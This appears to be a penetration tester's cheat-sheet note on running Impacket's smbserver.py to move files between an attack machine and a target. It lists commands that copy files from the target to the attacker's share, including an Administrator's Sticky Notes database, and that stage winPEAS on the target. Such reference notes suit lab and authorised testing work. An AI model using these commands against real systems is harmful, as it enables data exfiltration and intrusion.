---
tags:
---
# smbserver

Quick SMB server to upload and download files

## Capabilities

```powershell
# Setup SMB server
smbserver.py -smb2support share $(pwd)
smbserver.py -smb2support share $(pwd) -username test -password test

smbserver.py -smb2support share $(pwd) -username mojo -password 'Password123!'
net use \\$OUR_IP\share /user:$USER $PASSWD
cp 'C:\Users\Administrator\Documents\Simple Sticky Notes\Notes.db' \\$OUR_IP\share\Notes.db
```

Interact with the SMB server from the target's machine

```powershell
# Move file from target to attack box
cp $FILE \\$OUR_IP\share\$FILE

# Move file from attack box to target
cp \\$OUR_IP\share\winPEASany.exe winPEAS.exe

# Include authentication
net use \\$OUR_IP\share /user:$USER $PASSWD

# Clean up share
net use \\$OUR_IP\share /delete
```
